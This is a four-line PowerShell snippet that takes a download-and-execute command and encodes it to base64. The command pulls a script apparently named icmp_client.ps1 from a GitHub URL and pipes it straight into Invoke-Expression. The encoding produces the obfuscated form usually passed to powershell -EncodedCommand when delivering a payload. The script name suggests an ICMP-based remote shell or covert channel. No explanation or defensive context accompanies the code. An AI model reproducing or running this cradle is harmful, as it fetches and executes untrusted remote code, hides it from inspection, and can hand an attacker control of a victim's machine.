$Text = ‘iwr https://raw.githubusercontent.com/Clickest/a/master/icmp_client.ps1|iex’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText